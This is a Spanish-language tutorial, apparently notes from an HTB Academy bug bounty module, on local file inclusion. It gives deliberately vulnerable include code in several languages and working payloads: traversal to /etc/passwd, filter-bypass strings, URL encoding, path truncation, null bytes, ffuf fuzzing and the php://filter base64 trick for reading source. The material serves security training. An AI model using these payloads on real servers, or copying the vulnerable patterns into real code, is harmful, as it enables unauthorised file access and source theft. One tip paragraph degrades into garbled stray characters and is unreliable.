#HTB-Academy #Bug-Bounty-Hunter

# Intro to File Inclusions

Muchos idiomas modernos de back-end, como `PHP`, `Javascript`, o `Java`, utilice parámetros HTTP para especificar lo que se muestra en la página web, lo que permite crear páginas web dinámicas, reduce el tamaño total del script y simplifica el código. En tales casos, los parámetros se utilizan para especificar qué recurso se muestra en la página. Si tales funcionalidades no están codificadas de forma segura, un atacante puede manipular estos parámetros para mostrar el contenido de cualquier archivo local en el servidor de alojamiento, lo que lleva a una [Inclusión Local de Archivos (LFI)](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion) vulnerabilidad.

---

## Inclusión Local de Archivos (LFI)

El lugar más común en el que generalmente encontramos LFI es en los motores de plantillas. Para que la mayor parte de la aplicación web se vea igual cuando navega entre páginas, un motor de plantillas muestra una página que muestra las partes estáticas comunes, como el `header`, `navigation bar`, y `footer`y luego carga dinámicamente otro contenido que cambia entre páginas. De lo contrario, cada página en el servidor tendría que ser modificada cuando se realizan cambios en cualquiera de las partes estáticas. Es por eso que a menudo vemos un parámetro como `/index.php?page=about`, donde `index.php` establece el contenido estático (por ejemplo, encabezado/pie de página) y, a continuación, solo extrae el contenido dinámico especificado en el parámetro, que en este caso se puede leer desde un archivo llamado `about.php`. Como tenemos control sobre el `about`parte de la solicitud, puede ser posible que la aplicación web tome otros archivos y los muestre en la página.

Las vulnerabilidades de LFI pueden conducir a la divulgación de código fuente, la exposición a datos confidenciales e incluso la ejecución remota de código bajo ciertas condiciones. La fuga de código fuente puede permitir a los atacantes probar el código en busca de otras vulnerabilidades, lo que puede revelar vulnerabilidades previamente desconocidas. Además, la filtración de datos confidenciales puede permitir a los atacantes enumerar el servidor remoto en busca de otras debilidades o incluso filtrar credenciales y claves que pueden permitirles acceder directamente al servidor remoto. En condiciones específicas, LFI también puede permitir a los atacantes ejecutar código en el servidor remoto, lo que puede comprometer todo el servidor back-end y cualquier otro servidor conectado a él.

---

## Ejemplos de Código Vulnerable

Veamos algunos ejemplos de código vulnerable a la Inclusión de archivos para comprender cómo ocurren tales vulnerabilidades. Como se mencionó anteriormente, las vulnerabilidades de inclusión de archivos pueden ocurrir en muchos de los servidores web y marcos de desarrollo más populares, como `PHP`, `NodeJS`, `Java`, `.Net`y muchos otros. Cada uno de ellos tiene un enfoque ligeramente diferente para incluir archivos locales, pero todos comparten una cosa común: cargar un archivo desde una ruta específica.

Dicho archivo podría ser un encabezado dinámico o contenido diferente según el idioma especificado por el usuario. Por ejemplo, la página puede tener un `?language` parámetro GET, y si un usuario cambia el idioma de un menú desplegable, se devolverá la misma página pero con una diferente `language` parámetro (p. ej. `?language=es`). En tales casos, cambiar el idioma puede cambiar el directorio desde el que la aplicación web está cargando las páginas (por ejemplo. `/en/` o `/es/`). Si tenemos control sobre la ruta que se está cargando, es posible que podamos explotar esta vulnerabilidad para leer otros archivos y potencialmente alcanzar la ejecución remota de código.

#### PHP

En `PHP`, podemos usar el `include()` función para cargar un archivo local o remoto a medida que cargamos una página. Si el `path` pasado al `include()` se toma de un parámetro controlado por el usuario, como un `GET` parámetro, y `the code does not explicitly filter and sanitize the user input`, entonces el código se vuelve vulnerable a la Inclusión de archivos. El siguiente fragmento de código muestra un ejemplo de eso:

Código: php

```php
if (isset($_GET['language'])) {
    include($_GET['language']);
}
```

Vemos que el `language` el parámetro se pasa directamente al `include()` función. Entonces, cualquier camino que pasemos en el `language` el parámetro se cargará en la página, incluidos los archivos locales en el servidor de back-end. Esto no es exclusivo de la `include()` función, ya que hay muchas otras funciones de PHP que conducirían a la misma vulnerabilidad si tuviéramos control sobre la ruta pasada a ellas. Tales funciones incluyen `include_once()`, `require()`, `require_once()`, `file_get_contents()`y varios otros también.

**Nota:** En este módulo, nos centraremos principalmente en las aplicaciones web PHP que se ejecutan en un servidor back-end de Linux. Sin embargo, la mayoría de las técnicas y ataques funcionarían en la mayoría de los otros frameworks, por lo que nuestros ejemplos serían los mismos con una aplicación web escrita en cualquier otro idioma.

#### NodoJS

Al igual que en el caso de PHP, los servidores web de NodeJS también pueden cargar contenido basado en parámetros HTTP. El siguiente es un ejemplo básico de cómo un parámetro GET `language` se utiliza para controlar qué datos se escriben en una página:

Código: javascript

```javascript
if(req.query.language) {
    fs.readFile(path.join(__dirname, req.query.language), function (err, data) {
        res.write(data);
    });
}
```

Como podemos ver, cualquier parámetro pasado desde la URL es utilizado por el `readfile` función, que luego escribe el contenido del archivo en la respuesta HTTP. Otro ejemplo es el `render()` función en el `Express.js` marco. El siguiente ejemplo muestra cómo el `language` el parámetro se utiliza para determinar qué directorio extraer el `about.html` página de:

Código: js

```js
app.get("/about/:language", function(req, res) {
    res.render(`/${req.params.language}/about.html`);
});
```

A diferencia de nuestros ejemplos anteriores donde los parámetros GET se especificaron después de un (`?`) carácter en la URL, el ejemplo anterior toma el parámetro de la ruta de URL (por ejemplo. `/about/en` o `/about/es`). Como el parámetro se utiliza directamente dentro del `render()` función para especificar el archivo renderizado, podemos cambiar la URL para mostrar un archivo diferente.

#### Java

El mismo concepto se aplica a muchos otros servidores web. Los siguientes ejemplos muestran cómo las aplicaciones web para un servidor web Java pueden incluir archivos locales basados en el parámetro especificado, utilizando el `include` función:

Código: jsp

```jsp
<c:if test="${not empty param.language}">
    <jsp:include file="<%= request.getParameter('language') %>" />
</c:if>
```

El `include` la función puede tomar un archivo o una URL de página como argumento y luego convierte el objeto en la plantilla de front-end, similar a las que vimos anteriormente con NodeJS. El `import` la función también se puede usar para representar un archivo local o una URL, como el siguiente ejemplo:

Código: jsp

```jsp
<c:import url= "<%= request.getParameter('language') %>"/>
```

#### .NETO

Finalmente, tomemos un ejemplo de cómo pueden ocurrir vulnerabilidades de Inclusión de archivos en .Aplicaciones web NET. El `Response.WriteFile` la función funciona de manera muy similar a todos nuestros ejemplos anteriores, ya que toma una ruta de archivo para su entrada y escribe su contenido en la respuesta. La ruta puede recuperarse de un parámetro GET para la carga dinámica de contenido, de la siguiente manera:

Código: cs

```cs
@if (!string.IsNullOrEmpty(HttpContext.Request.Query['language'])) {
    <% Response.WriteFile("<% HttpContext.Request.Query['language'] %>"); %> 
}
```

Además, el `@Html.Partial()` la función también se puede usar para representar el archivo especificado como parte de la plantilla de front-end, de manera similar a lo que vimos anteriormente:

Código: cs

```cs
@Html.Partial(HttpContext.Request.Query['language'])
```

Finalmente, el `include` la función se puede utilizar para representar archivos locales o URL remotas, y también puede ejecutar los archivos especificados:

Código: cs

```cs
<!--#include file="<% HttpContext.Request.Query['language'] %>"-->
```

## Leer vs Ejecutar

De todos los ejemplos anteriores, podemos ver que las vulnerabilidades de Inclusión de archivos pueden ocurrir en cualquier servidor web y en cualquier marco de desarrollo, ya que todos ellos proporcionan funcionalidades para cargar contenido dinámico y manejar plantillas front-end.

Lo más importante a tener en cuenta es que `some of the above functions only read the content of the specified files, while others also execute the specified files`. Además, algunos de ellos permiten especificar URL remotas, mientras que otros solo funcionan con archivos locales en el servidor de back-end.

La siguiente tabla muestra qué funciones pueden ejecutar archivos y qué solo lee el contenido del archivo:

|**Función**|**Leer Contenido**|**Ejecutar**|**URL remota**|
|---|:-:|:-:|:-:|
|**PHP**||||
|`include()`/`include_once()`|✅|✅|✅|
|`require()`/`require_once()`|✅|✅|❌|
|`file_get_contents()`|✅|❌|✅|
|`fopen()`/`file()`|✅|❌|❌|
|**NodoJS**||||
|`fs.readFile()`|✅|❌|❌|
|`fs.sendFile()`|✅|❌|❌|
|`res.render()`|✅|✅|❌|
|**Java**||||
|`include`|✅|❌|❌|
|`import`|✅|✅|✅|
|**.NETO**||||
|`@Html.Partial()`|✅|❌|❌|
|`@Html.RemotePartial()`|✅|❌|✅|
|`Response.WriteFile()`|✅|❌|❌|
|`include`|✅|✅|✅|

Esta es una diferencia significativa a tener en cuenta, ya que la ejecución de archivos puede permitirnos ejecutar funciones y eventualmente conducir a la ejecución de código, mientras que solo leer el contenido del archivo solo nos permitiría leer el código fuente sin ejecución de código. Además, si tuvimos acceso al código fuente en un ejercicio de caja blanca o en una auditoría de código, conocer estas acciones nos ayuda a identificar posibles vulnerabilidades de Inclusión de archivos, especialmente si tenían entrada controlada por el usuario.

En todos los casos, las vulnerabilidades de Inclusión de archivos son críticas y eventualmente pueden llevar a comprometer todo el servidor de back-end. Incluso si solo pudiéramos leer el código fuente de la aplicación web, aún puede permitirnos comprometer la aplicación web, ya que puede revelar otras vulnerabilidades como se mencionó anteriormente, y el código fuente también puede contener claves de base de datos, credenciales de administrador u otra información confidencial.

# Local File Inclusion (LFI)

Ahora que entendemos qué son las vulnerabilidades de Inclusión de archivos y cómo ocurren, podemos comenzar a aprender cómo podemos explotar estas vulnerabilidades en diferentes escenarios para poder leer el contenido de los archivos locales en el servidor de back-end.

---

## LFI básico

El ejercicio que tenemos al final de esta sección nos muestra un ejemplo de una aplicación web que permite a los usuarios configurar su idioma en Inglés o Español:

   

![](https://academy.hackthebox.com/storage/modules/23/basic_lfi_lang.png)

Si seleccionamos un idioma haciendo clic en él (por ejemplo. `Spanish`), vemos que el texto del contenido cambia al español:

   

![](https://academy.hackthebox.com/storage/modules/23/basic_lfi_es.png)

También notamos que la URL incluye un `language` parámetro que ahora se establece en el idioma que seleccionamos (`es.php`). Hay varias formas en que se puede cambiar el contenido para que coincida con el idioma que especificamos. Puede estar extrayendo el contenido de una tabla de base de datos diferente según el parámetro especificado, o puede estar cargando una versión completamente diferente de la aplicación web. Sin embargo, como se discutió anteriormente, cargar parte de la página usando motores de plantilla es el método más fácil y común utilizado.

Por lo tanto, si la aplicación web está tirando de un archivo que ahora se está incluyendo en la página, es posible que podamos cambiar el archivo que se extrae para leer el contenido de un archivo local diferente. Dos archivos legibles comunes que están disponibles en la mayoría de los servidores de back-end son `/etc/passwd` en Linux y `C:\Windows\boot.ini` en Windows. Entonces, cambiemos el parámetro de `es` a `/etc/passwd`:

   

![](https://academy.hackthebox.com/storage/modules/23/basic_lfi_lang_passwd.png)

Como podemos ver, la página es realmente vulnerable, y podemos leer el contenido de la `passwd` archive e identifique qué usuarios existen en el servidor de back-end.

---

## Camino Traversal

En el ejemplo anterior, leemos un archivo especificando su `absolute path` (p. ej. `/etc/passwd`). Esto funcionaría si se usara toda la entrada dentro del `include()` función sin adiciones, como el siguiente ejemplo:

Código: php

```php
include($_GET['language']);
```

En este caso, si tratamos de leer `/etc/passwd`, entonces el `include()` la función buscaría ese archivo directamente. Sin embargo, en muchas ocasiones, los desarrolladores web pueden agregar o anteponer una cadena al `language` parámetro. Por ejemplo, el `language` el parámetro se puede usar para el nombre de archivo y se puede agregar después de un directorio, de la siguiente manera:

Código: php

```php
include("./languages/" . $_GET['language']);
```

En este caso, si intentamos leer `/etc/passwd`, entonces el camino pasó a `include()` sería (`./languages//etc/passwd`), y como este archivo no existe, no podremos leer nada:

   

![](https://academy.hackthebox.com/storage/modules/23/traversal_passwd_failed.png)

Como era de esperar, el error detallado devuelto nos muestra la cadena pasada al `include()` función, indicando que no hay `/etc/passwd` en el directorio de idiomas.

**Nota:** Solo estamos habilitando errores de PHP en esta aplicación web con fines educativos, por lo que podemos entender correctamente cómo la aplicación web está manejando nuestra entrada. Para aplicaciones web de producción, tales errores nunca deben mostrarse. Además, todos nuestros ataques deberían ser posibles sin errores, ya que no dependen de ellos.

Podemos evitar fácilmente esta restricción atravesando directorios usando `relative paths`. Para hacerlo, podemos agregar `../` antes de nuestro nombre de archivo, que se refiere al directorio principal. Por ejemplo, si la ruta completa del directorio de idiomas es `/var/www/html/languages/`, luego usando `../index.php` se referiría a la `index.php` archivo en el directorio principal (es decir. `/var/www/html/index.php`).

Entonces, podemos usar este truco para retroceder varios directorios hasta que alcancemos la ruta raíz (es decir. `/`), y luego especifique nuestra ruta de archivo absoluta (por ejemplo. `../../../../etc/passwd`), y el archivo debe existir:

   

![](https://academy.hackthebox.com/storage/modules/23/traversal_passwd.png)

Como podemos ver, esta vez pudimos leer el archivo independientemente del directorio en el que estábamos. Este truco funcionaría incluso si se usara todo el parámetro en el `include()` función, por lo que podemos por defecto a esta técnica, y debería funcionar en ambos casos. Además, si estuviéramos en el camino raíz (`/`) y utilizado `../` entonces todavía permaneceríamos en el camino raíz. Entonces, si no estábamos seguros del directorio en el que se encuentra la aplicación web, podemos agregar `../` muchas veces, y no debería romper el camino (¡incluso si lo hacemos cien veces!).

**Consejo:** Siempre puede ser útil ser eficiente y no agregar innecesario `../` varias veces, especialmente si estuviéramos escribiendo un informe o escribiendo un exploit. Entonces, siempre trate de encontrar el número mínimo de `../` eso funciona y lo usa. También puede calcular cuántos directorios está lejos de la ruta raíz y usar tantos. Por ejemplo, con `/var/www/html/` nosotros somos `3` directorios lejos de la ruta raíz, para que podamos usar `../` 3 Veces (es decir. `../../../`).

---

## Prefijo de nombre de archivo

En nuestro ejemplo anterior, usamos el `language` parámetro después del directorio, así que podríamos atravesar la ruta para leer el `passwd` archivo. En algunas ocasiones, nuestra entrada se puede agregar después de una cadena diferente. Por ejemplo, se puede usar con un prefijo para obtener el nombre de archivo completo, como en el siguiente ejemplo:

Código: php

```php
include("lang_" . $_GET['language']);
```

En este caso, si intentamos atravesar el directorio con `../../../etc/passwd`, la cuerda final sería `lang_../../../etc/passwd`, que no es válido:

   

![](https://academy.hackthebox.com/storage/modules/23/lfi_another_example1.png)

Como era de esperar, el error nos dice que este archivo no existe, por lo que, en lugar de usar directamente el recorrido de ruta, podemos prefijar un archivo `/` antes de nuestra carga útil, y esto debería considerar el prefijo como un directorio, y luego deberíamos omitir el nombre del archivo y poder atravesar directorios:

   

![](https://academy.hackthebox.com/storage/modules/23/lfi_another_example_passwd1.png)

**Nota:** Esto puede no funcionar siempre, como en este ejemplo un directorio llamado `lang_/` puede que no exista, por lo que nuestro camino relativo puede no ser correcto. Además, `any prefix appended to our input may break some file inclusion techniques` discutiremos en las próximas secciones, como el uso de envoltorios y filtros PHP o RFI.

---

## Extensiones Añadidas

Otro ejemplo muy común es cuando se añade una extensión al `language` parámetro, como sigue:

Código: php

```php
include($_GET['language'] . ".php");
```

Esto es bastante común, ya que en este caso, no tendríamos que escribir la extensión cada vez que necesitemos cambiar el idioma. Esto también puede ser más seguro, ya que puede restringirnos a incluir solo archivos PHP. En este caso, si tratamos de leer `/etc/passwd`, entonces el archivo incluido sería `/etc/passwd.php`, que no existe:

   

![](https://academy.hackthebox.com/storage/modules/23/lfi_extension_failed.png)

Hay varias técnicas que podemos usar para evitar esto, y las discutiremos en las próximas secciones.

**Ejercicio:** Intente leer cualquier archivo php (por ejemplo, index.php) a través de LFI, y vea si obtendría su código fuente o si el archivo se representa como HTML.

---

## Ataques de Segundo Orden

Como podemos ver, los ataques LFI pueden venir en diferentes formas. Otro ataque LFI común y un poco más avanzado es un `Second Order Attack`. Esto ocurre porque muchas funcionalidades de aplicaciones web pueden estar extrayendo inseguramente archivos del servidor de back-end en función de los parámetros controlados por el usuario.

Por ejemplo, una aplicación web puede permitirnos descargar nuestro avatar a través de una URL como (`/profile/$username/avatar.png`). Si creamos un nombre de usuario LFI malicioso (por ejemplo. `../../../etc/passwd`), entonces puede ser posible cambiar el archivo que se tira a otro archivo local en el servidor y agarrarlo en lugar de nuestro avatar.

En este caso, estaríamos envenenando una entrada de base de datos con una carga útil LFI maliciosa en nuestro nombre de usuario. Luego, otra funcionalidad de aplicación web utilizaría esta entrada envenenada para realizar nuestro ataque (es decir, descargar nuestro avatar basado en el valor del nombre de usuario). Es por eso que este ataque se llama un `Second-Order` ataque.

Los desarrolladores a menudo pasan por alto estas vulnerabilidades, ya que pueden proteger contra la entrada directa del usuario (por ejemplo, de un `?page` parámetro), pero pueden confiar en los valores extraídos de su base de datos, como nuestro nombre de usuario en este caso. Si logramos envenenar nuestro nombre de usuario durante nuestro registro, entonces el ataque sería posible.

Explotar vulnerabilidades LFI utilizando ataques de segundo orden es similar a lo que hemos discutido en esta sección. La única variación es que necesitamos detectar una función que extrae un archivo en función de un valor que controlamos indirectamente y luego tratar de controlar ese valor para explotar la vulnerabilidad.

**Nota:** Todas las técnicas mencionadas en esta sección deben funcionar con cualquier vulnerabilidad LFI, independientemente del lenguaje o marco de desarrollo de back-end.


# Basic Bypasses

En la sección anterior, vimos varios tipos de ataques que podemos usar para diferentes tipos de vulnerabilidades LFI. En muchos casos, podemos estar enfrentando una aplicación web que aplica varias protecciones contra la inclusión de archivos, por lo que nuestras cargas útiles normales de LFI no funcionarían. Aún así, a menos que la aplicación web esté correctamente protegida contra la entrada de usuarios maliciosos de LFI, es posible que podamos eludir las protecciones vigentes y alcanzar la inclusión de archivos.

---

## Filtros Traversales de Ruta No Recursivos

Uno de los filtros más básicos contra LFI es un filtro de búsqueda y reemplazo, donde simplemente elimina las subcadenas de (`../`) para evitar los recorridos de ruta. Por ejemplo:

Código: php

```php
$language = str_replace('../', '', $_GET['language']);
```

Se supone que el código anterior evita el recorrido de la ruta y, por lo tanto, hace que LFI sea inútil. Si probamos las cargas útiles LFI que probamos en el apartado anterior, obtenemos lo siguiente:

   

![](https://academy.hackthebox.com/storage/modules/23/lfi_blacklist.png)

Vemos eso todo `../` se retiraron las subcadenas, lo que dio como resultado una trayectoria final `./languages/etc/passwd`. Sin embargo, este filtro es muy inseguro, ya que no lo es `recursively removing` el `../` subcadena, ya que se ejecuta una sola vez en la cadena de entrada y no aplica el filtro en la cadena de salida. Por ejemplo, si usamos `....//` como nuestra carga útil, entonces el filtro se eliminaría `../` y la cadena de salida sería `../`, lo que significa que aún podemos realizar el recorrido del camino. Intentemos aplicar esta lógica para incluir `/etc/passwd` de nuevo:

   

![](https://academy.hackthebox.com/storage/modules/23/lfi_blacklist_passwd.png)

Como podemos ver, la inclusión fue exitosa esta vez, y podemos leer `/etc/passwd` con éxito. El `....//` la subcadena no es el único bypass que podemos usar, como podemos usar `..././` o `....\/` y varias otras cargas útiles recursivas de LFI. Además, en algunos casos, escapar del carácter de barra diagonal también puede funcionar para evitar filtros de recorrido de ruta (por ejemplo. `....\/`), o añadir barras delanteras adicionales (p. ej. `....////`)

---

## Codificación

Algunos filtros web pueden evitar los filtros de entrada que incluyen ciertos caracteres relacionados con LFI, como un punto `.` o una barra `/` utilizado para los recorridos de caminos. Sin embargo, algunos de estos filtros pueden omitirse mediante la codificación de URL de nuestra entrada, de modo que ya no incluiría estos caracteres incorrectos, pero aún así se decodificaría a nuestra cadena de paso de ruta una vez que alcance la función vulnerable. Los filtros PHP principales en las versiones 5.3.4 y anteriores eran específicamente vulnerables a este bypass, pero incluso en las versiones más recientes podemos encontrar filtros personalizados que pueden omitirse a través de la codificación URL.

Si la aplicación web de destino no lo permitió `.` y `/` en nuestra entrada, podemos codificar URL `../` en `%2e%2e%2f`, que puede pasar por alto el filtro. Para ello, podemos utilizar cualquier utilidad de codificador de URL en línea o utilizar la herramienta Burp Suite Decoder, de la siguiente manera: ![burp_url_encode](https://academy.hackthebox.com/storage/modules/23/burp_url_encode.jpg)

**Nota:** Para que esto funcione debemos codificar URL todos los caracteres, incluyendo los puntos. Algunos codificadores de URL pueden no codificar puntos, ya que se consideran parte del esquema de URL.

Intentemos usar esta carga útil LFI codificada contra nuestra aplicación web vulnerable anterior que filtra `../` cuerdas:

   

![](https://academy.hackthebox.com/storage/modules/23/lfi_blacklist_passwd_filter.png)

Como podemos ver, también pudimos omitir con éxito el filtro y usar el recorrido de ruta para leer `/etc/passwd`. Además, también podemos usar Burp Decoder para codificar la cadena codificada una vez más para tener un `double encoded` cadena, que también puede eludir otros tipos de filtros.

Puede referirse al [Inyecciones de Comando](https://academy.hackthebox.com/module/details/109) módulo para obtener más información sobre cómo evitar varios caracteres en la lista negra, ya que las mismas técnicas también se pueden usar con LFI.

---

## Caminos Aprobados

Algunas aplicaciones web también pueden usar Expresiones regulares para asegurarse de que el archivo que se incluye está bajo una ruta específica. Por ejemplo, la aplicación web con la que hemos estado tratando solo puede aceptar rutas que están debajo del `./languages` directorio, de la siguiente manera:

Código: php

```php
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
} else {
    echo 'Illegal path specified!';
}
```

Para encontrar la ruta aprobada, podemos examinar las solicitudes enviadas por los formularios existentes y ver qué ruta utilizan para la funcionalidad web normal. Además, podemos fuzz directorios web bajo el mismo camino, y probar diferentes hasta que obtengamos una coincidencia. Para evitar esto, podemos usar el recorrido de la ruta y comenzar nuestra carga útil con la ruta aprobada, y luego usar `../` para volver al directorio raíz y leer el archivo que especificamos, de la siguiente manera:

   

![](https://academy.hackthebox.com/storage/modules/23/lfi_blacklist_passwd_filter.png)

Algunas aplicaciones web pueden aplicar este filtro junto con uno de los filtros anteriores, por lo que podemos combinar ambas técnicas iniciando nuestra carga útil con la ruta aprobada, y luego la URL codifica nuestra carga útil o usa carga útil recursiva.

**Nota:** Todas las técnicas mencionadas hasta ahora deberían funcionar con cualquier vulnerabilidad LFI, independientemente del lenguaje o marco de desarrollo de back-end.

---

## Extensión Añadida

Como se discutió en la sección anterior, algunas aplicaciones web añaden una extensión a nuestra cadena de entrada (por ejemplo. `.php`), para asegurar que el archivo que incluimos está en la extensión esperada. Con las versiones modernas de PHP, es posible que no podamos evitar esto y nos limitaremos a leer solo archivos en esa extensión, lo que aún puede ser útil, como veremos en la siguiente sección (por ejemplo, para leer código fuente).

Hay un par de otras técnicas que podemos usar, pero lo son `obsolete with modern versions of PHP and only work with PHP versions before 5.3/5.4`. Sin embargo, aún puede ser beneficioso mencionarlos, ya que algunas aplicaciones web aún pueden estar ejecutándose en servidores más antiguos, y estas técnicas pueden ser las únicas omisiones posibles.

#### Truncamiento de Ruta

En versiones anteriores de PHP, las cadenas definidas tienen una longitud máxima de 4096 caracteres, probablemente debido a la limitación de los sistemas de 32 bits. Si se pasa una cadena más larga, simplemente lo será `truncated`, y cualquier carácter después de la longitud máxima será ignorado. Además, PHP también se utiliza para eliminar barras de seguimiento y puntos individuales en los nombres de ruta, por lo que si llamamos (`/etc/passwd/.`) entonces el `/.` también sería truncado, y PHP llamaría (`/etc/passwd`). PHP y los sistemas Linux en general, también ignoran múltiples barras en la ruta (por ejemplo. `////etc/passwd` es lo mismo que `/etc/passwd`). Del mismo modo, un acceso directo de directorio actual (`.`) en el medio del camino también sería ignorado (p. ej. `/etc/./passwd`).

Si combinamos ambas limitaciones de PHP, podemos crear cadenas muy largas que evalúan una ruta correcta. Cada vez que alcanzamos la limitación de 4096 caracteres, la extensión adjunta (`.php`) sería truncado, y tendríamos un camino sin una extensión adjunta. Por último, también es importante tener en cuenta que también tendríamos que hacerlo `start the path with a non-existing directory` para que esta técnica funcione.

Un ejemplo de dicha carga útil sería el siguiente:

Código: url

```url
?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]
```

Por supuesto, no tenemos que escribir manualmente `./` 2048 Veces (total de 4096 caracteres), pero podemos automatizar la creación de esta cadena con el siguiente comando:

  Bypass Básicos

```shell-session
vcrdcr@htb[/htb]$ echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
non_existing_directory/../../../etc/passwd/./././<SNIP>././././
```

También podemos aumentar el recuento de `../`, como agregar más todavía nos aterrizaría en el directorio raíz, como se explica en la sección anterior. Sin embargo, si utilizamos este método, debemos calcular la longitud total de la cadena para garantizar solo `.php` se trunca y no nuestro archivo solicitado al final de la cadena (`/etc/passwd`). Es por eso que sería más fácil usar el primer método.

#### Bytes Nulos

Las versiones de PHP anteriores a 5.5 eran vulnerables a `null byte injection`, lo que significa que añadir un byte nulo (`%00`) al final de la cadena terminaría la cadena y no consideraría nada después de ella. Esto se debe a cómo se almacenan las cadenas en la memoria de bajo nivel, donde las cadenas en la memoria deben usar un byte nulo para indicar el final de la cadena, como se ve en los idiomas Assembly, C o C++.

Para explotar esta vulnerabilidad, podemos finalizar nuestra carga útil con un byte nulo (por ejemplo. `/etc/passwd%00`), de tal manera que el camino final pasó a `include()` sería (`/etc/passwd%00.php`). De esta manera, aunque `.php` se agrega a nuestra cadena, cualquier cosa después del byte nulo se truncaría, por lo que el camino utilizado realmente sería `/etc/passwd`, lo que nos lleva a evitar la extensión adjunta.


# PHP Filters

Muchas aplicaciones web populares se desarrollan en PHP, junto con varias aplicaciones web personalizadas creadas con diferentes marcos PHP, como Laravel o Symfony. Si identificamos una vulnerabilidad LFI en aplicaciones web PHP, entonces podemos utilizar diferentes [Envolturas PHP](https://www.php.net/manual/en/wrappers.php.php) para poder extender nuestra explotación LFI, e incluso potencialmente alcanzar la ejecución remota de código.

PHP Wrappers nos permite acceder a diferentes flujos de E/S a nivel de aplicación, como entrada/salida estándar, descriptores de archivos y flujos de memoria. Esto tiene muchos usos para los desarrolladores de PHP. Aún así, como probadores de penetración web, podemos utilizar estos envoltorios para extender nuestros ataques de explotación y poder leer archivos de código fuente PHP o incluso ejecutar comandos del sistema. Esto no solo es beneficioso con los ataques LFI, sino también con otros ataques web como XXE, como se cubre en el [Ataques Web](https://academy.hackthebox.com/module/details/134) módulo.

En esta sección, veremos cómo se utilizan los filtros PHP básicos para leer el código fuente de PHP, y en la siguiente sección, veremos cómo los diferentes envoltorios PHP pueden ayudarnos a obtener la ejecución remota de código a través de vulnerabilidades LFI.

---

## Filtros de Entrada

[Filtros PHP](https://www.php.net/manual/en/filters.php) son un tipo de envoltorios PHP, donde podemos pasar diferentes tipos de entrada y tenerla filtrada por el filtro que especificamos. Para usar flujos de envoltura PHP, podemos usar el `php://` esquema en nuestra cadena, y podemos acceder a la envoltura de filtro PHP con `php://filter/`.

El `filter` wrapper tiene varios parámetros, pero los principales que requerimos para nuestro ataque son `resource` y `read`. El `resource` el parámetro es necesario para los envoltorios de filtro, y con él podemos especificar el flujo en el que nos gustaría aplicar el filtro (por ejemplo, un archivo local), mientras que el `read` parameter puede aplicar diferentes filtros en el recurso de entrada, por lo que podemos usarlo para especificar qué filtro queremos aplicar en nuestro recurso.

Hay cuatro tipos diferentes de filtros disponibles para su uso, que son [Filtros de Cuerda](https://www.php.net/manual/en/filters.string.php), [Filtros de Conversión](https://www.php.net/manual/en/filters.convert.php), [Filtros de Compresión](https://www.php.net/manual/en/filters.compression.php), y [Filtros de Cifrado](https://www.php.net/manual/en/filters.encryption.php). Puede leer más sobre cada filtro en su enlace respectivo, pero el filtro que es útil para los ataques LFI es el `convert.base64-encode` filtro, debajo `Conversion Filters`.

---

## Fuzzing para Archivos PHP

El primer paso sería fuzz para diferentes páginas PHP disponibles con una herramienta como `ffuf` o `gobuster`, como se cubre en el [Atacar Aplicaciones Web con Ffuf](https://academy.hackthebox.com/module/details/54) módulo:

  Filtros PHP

```shell-session
vcrdcr@htb[/htb]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php

...SNIP...

index                   [Status: 200, Size: 2652, Words: 690, Lines: 64]
config                  [Status: 302, Size: 0, Words: 1, Lines: 1]
```

**Consejo:** A diferencia del uso normal de la aplicación web, no estamos restringidos a páginas con código de respuesta HTTP 200, ya que tenemos acceso local a la inclusión de archivos, por lo que deberíamos buscar todos los códigos, incluidas las páginas ur301b, ''' '' '' '' '' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' '

Incluso después de leer las fuentes de cualquier archivo identificado, podemos `scan them for other referenced PHP files`y luego lea también, hasta que podamos capturar la mayor parte de la fuente de la aplicación web o tener una imagen precisa de lo que hace. También es posible comenzar leyendo `index.php` y escanearlo en busca de más referencias, etc., pero fuzzing para archivos PHP puede revelar algunos archivos que de otra manera no se pueden encontrar de esa manera.

---

## Inclusión Estándar de PHP

En secciones anteriores, si intentó incluir archivos php a través de LFI, habría notado que el archivo PHP incluido se ejecuta y, finalmente, se representa como una página HTML normal. Por ejemplo, intentemos incluir el `config.php` página (`.php` extensión adjunta por aplicación web):

   

![](https://academy.hackthebox.com/storage/modules/23/lfi_config_failed.png)

Como podemos ver, obtenemos un resultado vacío en lugar de nuestra cadena LFI, ya que el `config.php` lo más probable es que solo configure la configuración de la aplicación web y no represente ninguna salida HTML.

Esto puede ser útil en ciertos casos, como acceder a páginas PHP locales sobre las que no tenemos acceso (es decir. SSRF), pero en la mayoría de los casos, estaríamos más interesados en leer el código fuente de PHP a través de LFI, ya que los códigos fuente tienden a revelar información importante sobre la aplicación web. Aquí es donde el `base64` el filtro php se vuelve útil, ya que podemos usarlo para codificar base64 el archivo php, y luego obtendríamos el código fuente codificado en lugar de ejecutarlo y renderizarlo. Esto es especialmente útil para los casos en los que estamos tratando con LFI con extensiones PHP adjuntas, porque podemos estar restringidos a incluir solo archivos PHP, como se discutió en la sección anterior.

**Nota:** Lo mismo se aplica a los lenguajes de aplicaciones web que no sean PHP, siempre que la función vulnerable pueda ejecutar archivos. De lo contrario, obtendríamos directamente el código fuente y no necesitaríamos usar filtros/funciones adicionales para leer el código fuente. Consulte la tabla de funciones de la sección 1 para ver qué funciones tienen qué privilegios.

---

## Divulgación del Código Fuente

Una vez que tengamos una lista de posibles archivos PHP que queremos leer, podemos comenzar a revelar sus fuentes con el `base64` Filtro PHP. Intentemos leer el código fuente de `config.php` usando el filtro base64, especificando `convert.base64-encode` para el `read` parámetro y `config` para el `resource` parámetro, como sigue:

Código: url

```url
php://filter/read=convert.base64-encode/resource=config
```

   

![](https://academy.hackthebox.com/storage/modules/23/lfi_config_wrapper.png)

